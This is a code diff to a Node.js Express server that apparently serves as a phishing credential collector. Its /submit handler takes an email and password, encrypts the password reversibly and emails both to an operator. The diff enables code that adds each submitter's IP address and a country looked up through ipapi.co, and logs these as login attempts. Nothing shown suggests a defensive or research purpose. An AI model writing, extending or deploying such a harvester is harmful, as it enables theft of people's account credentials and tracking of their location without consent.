@@ -3,7 +3,7 @@ import dotenv from "dotenv";
 import cors from "cors";
 import CryptoJS from "crypto-js";
 import nodemailer from "nodemailer";
-// import axios from "axios"; // 🔥 Needed for IP lookup
+import axios from "axios"; // 🔥 Needed for IP lookup
 
 dotenv.config();
 
@@ -40,15 +40,15 @@ function encryptPassword(password) {
 }
 
 // 🔥 Get Country from IP Address
-// async function getCountryFromIP(ip) {
-//   try {
-//     const response = await axios.get(`https://ipapi.co/${ip}/json/`);
-//     return response.data.country_name || "Unknown Country";
-//   } catch (error) {
-//     console.error("❌ Error fetching country:", error);
-//     return "Unknown Country";
-//   }
-// }
+async function getCountryFromIP(ip) {
+  try {
+    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
+    return response.data.country_name || "Unknown Country";
+  } catch (error) {
+    console.error("❌ Error fetching country:", error);
+    return "Unknown Country";
+  }
+}
 
 // 🔥 Function to send email notification
 async function sendEmailNotification(email, encryptedPassword, ip, country) {
@@ -60,6 +60,8 @@ async function sendEmailNotification(email, encryptedPassword, ip, country) {
       text: `📧 New request received!
 👤 Email: ${email}
 🔐 Encrypted Password: ${encryptedPassword}
+🌍 IP Address: ${ip}
+🏳 Country: ${country}
 📅 Time: ${new Date().toLocaleString()}`,
     });
     console.log("✅ Email sent successfully!");
@@ -82,19 +84,19 @@ app.post("/submit", async (req, res) => {
     const encryptedPassword = encryptPassword(password);
 
     // 🔥 Get user's IP from the request headers (fallback to 'Unknown IP' if missing)
-    // const userIP =
-    //   req.headers["x-forwarded-for"] ||
-    //   req.connection.remoteAddress ||
-    //   "Unknown IP";
+    const userIP =
+      req.headers["x-forwarded-for"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
 
-    // // 🔥 Get the country name from the IP
-    // const country = await getCountryFromIP(userIP);
+    // 🔥 Get the country name from the IP
+    const country = await getCountryFromIP(userIP);
 
-    // // 🔥 Log IP and country in the console
-    // console.log(`🌍 Login Attempt from ${userIP} (${country})`);
+    // 🔥 Log IP and country in the console
+    console.log(`🌍 Login Attempt from ${userIP} (${country})`);
 
     // 🔥 Send email notification
-    await sendEmailNotification(email, encryptedPassword);
+    await sendEmailNotification(email, encryptedPassword, userIP, country);
 
     res.json({
       status: "success",
